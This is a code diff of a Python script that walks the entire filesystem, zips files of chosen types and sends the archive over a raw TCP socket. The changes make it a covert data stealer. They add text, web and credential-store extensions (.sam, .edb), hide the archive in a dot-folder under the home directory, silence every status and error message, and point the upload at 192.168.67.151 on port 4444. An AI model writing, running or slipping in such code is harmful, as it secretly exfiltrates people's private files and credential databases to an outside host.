@@ -6,10 +6,13 @@ import zipfile
 root_directory = os.path.abspath('/')
 
 # Set the media extensions to filter
-media_extensions = [".mp3", ".mp4", ".wav", ".avi"]
+media_extensions = [".mp3", ".mp4", ".wav", ".avi",".jpg",".jpeg",".text",".txt",".sam",".html",".htm",".edb"]
 
 # Create a ZipFile object to save the media files to
-zip_file_path = 'media_files.zip'
+zip_file_path = os.path.join(os.path.expanduser("~"), ".hidden", ".media_files.zip")
+if not os.path.exists(os.path.dirname(zip_file_path)):
+    os.makedirs(os.path.dirname(zip_file_path))
+
 with zipfile.ZipFile(zip_file_path, 'w') as zip_file:
     # Walk through every directory and file in the root directory
     for directory_path, directory_names, file_names in os.walk(root_directory):
@@ -20,13 +23,13 @@ with zipfile.ZipFile(zip_file_path, 'w') as zip_file:
             try:
                 zip_file.write(media_file)
             except PermissionError:
-                print(f"Permission denied for file: {media_file}")
+                print(f"")
 
-print(f'Media files saved to {zip_file_path}')
+print(f'')
 
 # Send the zip file to a server
-ip_address = '127.0.0.1'
-port = 5000
+ip_address = '192.168.67.151'
+port = 4444
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.connect((ip_address, port))
@@ -34,4 +37,5 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         data = file.read()
         sock.sendall(data)
 
-print('Zip file sent successfully.')
+
+
